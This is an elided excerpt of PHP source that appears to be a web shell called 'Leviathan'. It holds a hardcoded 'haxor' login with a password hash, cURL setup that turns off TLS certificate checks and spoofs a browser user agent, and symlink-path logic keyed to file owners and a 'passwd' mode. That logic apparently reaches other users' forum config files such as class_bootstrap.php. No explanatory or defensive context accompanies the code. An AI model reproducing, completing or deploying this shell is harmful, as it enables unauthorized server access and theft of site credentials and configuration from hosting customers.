...
$GLOBALS['Leviathan'] = array(
    'username' => 'haxor',
    'password' => '7e286a5214ebf7749aa5260fdccb9118',
    'safe_mode' => '1',
    'login_page' => 'gui',
    'show_icons' => '1',
...
$curl = curl_init();
curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($curl, CURLOPT_HEADER,0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
...
$l=0;
$cc=0;
foreach($files as $f){$f['name'] = htmlspecialchars($f['name']);
...
foreach($lines as $line){
	...
	if(!$anonymous){
		...
		$sympath = str_replace("{user}", $owner, $makepwd);$http = "http://".$domain;if($state == "passwd"){
...
$login = $path."/login.php";$class = $path."/includes/class_bootstrap.php";
